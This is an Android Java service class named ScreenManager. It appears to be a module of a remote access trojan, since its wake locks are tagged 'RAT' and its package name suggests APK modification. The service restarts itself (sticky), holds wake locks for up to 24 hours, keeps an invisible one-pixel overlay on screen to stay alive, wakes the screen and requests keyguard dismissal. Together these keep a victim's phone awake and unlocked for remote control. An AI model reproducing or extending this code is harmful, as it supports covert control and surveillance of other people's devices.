package com.apkmodifier;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.Build;
import android.view.WindowManager;
import android.graphics.PixelFormat;
import android.view.Gravity;
import android.view.View;
import android.widget.FrameLayout;
import android.util.Log;
import android.provider.Settings;

/**
 * Screen Manager to bypass black screen issues
 * Keeps device awake and prevents screen lock when needed
 */
public class ScreenManager extends Service {
    private static final String TAG = "ScreenManager";
    
    private PowerManager.WakeLock wakeLock;
    private PowerManager powerManager;
    private WindowManager windowManager;
    private View overlayView;
    
    @Override
    public void onCreate() {
        super.onCreate();
        initializeWakeLock();
        initializeOverlay();
        Log.d(TAG, "ScreenManager initialized");
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;
        
        if (action != null) {
            switch (action) {
                case "KEEP_AWAKE":
                    acquireWakeLock();
                    break;
                case "ALLOW_SLEEP":
                    releaseWakeLock();
                    break;
                case "SHOW_OVERLAY":
                    showOverlay();
                    break;
                case "HIDE_OVERLAY":
                    hideOverlay();
                    break;
                case "WAKE_SCREEN":
                    wakeScreen();
                    break;
                case "TURN_ON_SCREEN":
                    turnOnScreen();
                    break;
            }
        } else {
            // Default: keep awake
            acquireWakeLock();
        }
        
        return START_STICKY;
    }
    
    private void initializeWakeLock() {
        try {
            powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager != null) {
                // Create wake lock with full capabilities
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK | 
                    PowerManager.ACQUIRE_CAUSES_WAKEUP |
                    PowerManager.ON_AFTER_RELEASE,
                    "RAT:ScreenManager"
                );
                wakeLock.setReferenceCounted(false);
                Log.d(TAG, "WakeLock initialized");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error initializing wake lock", e);
        }
    }
    
    private void initializeOverlay() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    Log.w(TAG, "Overlay permission not granted");
                    return;
                }
            }
            
            windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            
            // Create invisible overlay to keep activity alive
            overlayView = new FrameLayout(this);
            overlayView.setBackgroundColor(0x00000000); // Transparent
            
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                1, 1,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O 
                    ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    : WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            );
            
            params.gravity = Gravity.TOP | Gravity.LEFT;
            params.x = 0;
            params.y = 0;
            
            Log.d(TAG, "Overlay initialized");
        } catch (Exception e) {
            Log.e(TAG, "Error initializing overlay", e);
        }
    }
    
    private void acquireWakeLock() {
        try {
            if (wakeLock != null && !wakeLock.isHeld()) {
                wakeLock.acquire(24 * 60 * 60 * 1000L); // 24 hours
                Log.d(TAG, "WakeLock acquired");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring wake lock", e);
        }
    }
    
    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                Log.d(TAG, "WakeLock released");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error releasing wake lock", e);
        }
    }
    
    private void showOverlay() {
        try {
            if (windowManager != null && overlayView != null && overlayView.getParent() == null) {
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    1, 1,
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.O 
                        ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        : WindowManager.LayoutParams.TYPE_PHONE,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                    PixelFormat.TRANSLUCENT
                );
                
                params.gravity = Gravity.TOP | Gravity.LEFT;
                windowManager.addView(overlayView, params);
                Log.d(TAG, "Overlay shown");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error showing overlay", e);
        }
    }
    
    private void hideOverlay() {
        try {
            if (windowManager != null && overlayView != null && overlayView.getParent() != null) {
                windowManager.removeView(overlayView);
                Log.d(TAG, "Overlay hidden");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error hiding overlay", e);
        }
    }
    
    private void wakeScreen() {
        try {
            if (powerManager != null) {
                PowerManager.WakeLock tempWakeLock = powerManager.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "RAT:TempWake"
                );
                tempWakeLock.acquire(5000); // 5 seconds
                tempWakeLock.release();
                Log.d(TAG, "Screen woken");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error waking screen", e);
        }
    }
    
    private void turnOnScreen() {
        try {
            // Try multiple methods to turn on screen
            
            // Method 1: Wake lock
            if (powerManager != null) {
                PowerManager.WakeLock fullWakeLock = powerManager.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP |
                    PowerManager.ON_AFTER_RELEASE,
                    "RAT:FullWake"
                );
                fullWakeLock.acquire(3000);
                fullWakeLock.release();
            }
            
            // Method 2: Disable keyguard
            android.app.KeyguardManager keyguardManager = 
                (android.app.KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
            
            if (keyguardManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    keyguardManager.requestDismissKeyguard(null, null);
                }
            }
            
            Log.d(TAG, "Screen turned on");
        } catch (Exception e) {
            Log.e(TAG, "Error turning on screen", e);
        }
    }
    
    /**
     * Check if screen is on
     */
    public boolean isScreenOn() {
        try {
            if (powerManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                    return powerManager.isInteractive();
                } else {
                    return powerManager.isScreenOn();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking screen state", e);
        }
        return false;
    }
    
    /**
     * Prevent sleep while operation is running
     */
    public void preventSleepDuring(Runnable operation) {
        acquireWakeLock();
        try {
            operation.run();
        } finally {
            releaseWakeLock();
        }
    }
    
    /**
     * Keep screen on for duration
     */
    public void keepScreenOn(long durationMs) {
        acquireWakeLock();
        new android.os.Handler().postDelayed(() -> releaseWakeLock(), durationMs);
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        releaseWakeLock();
        hideOverlay();
        Log.d(TAG, "ScreenManager destroyed");
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    /**
     * Static helper methods for easy access
     */
    public static void keepAwake(Context context) {
        Intent intent = new Intent(context, ScreenManager.class);
        intent.setAction("KEEP_AWAKE");
        context.startService(intent);
    }
    
    public static void allowSleep(Context context) {
        Intent intent = new Intent(context, ScreenManager.class);
        intent.setAction("ALLOW_SLEEP");
        context.startService(intent);
    }
    
    public static void wakeUp(Context context) {
        Intent intent = new Intent(context, ScreenManager.class);
        intent.setAction("WAKE_SCREEN");
        context.startService(intent);
    }
    
    public static void turnScreenOn(Context context) {
        Intent intent = new Intent(context, ScreenManager.class);
        intent.setAction("TURN_ON_SCREEN");
        context.startService(intent);
    }
}
